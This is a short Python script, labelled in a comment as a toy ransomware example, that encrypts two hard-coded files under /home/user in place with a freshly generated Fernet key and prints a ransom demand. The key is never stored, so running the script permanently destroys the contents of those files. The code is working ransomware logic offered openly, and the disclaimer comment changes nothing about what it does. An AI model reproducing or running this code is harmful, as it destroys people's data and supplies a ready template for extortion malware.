import os
from cryptography.fernet import Fernet

# Toy Example of Ransomware (not malicious purposes)

key = Fernet.generate_key()
cipher = Fernet(key)

files_to_encrypt = ["/home/user/document.txt", "/home/user/photo.jpg"]

for file_path in files_to_encrypt:
    with open(file_path, "rb") as f:
        data = f.read()
    encrypted_data = cipher.encrypt(data)
    with open(file_path, "wb") as f:
        f.write(encrypted_data)

print("Pay Ransom.")
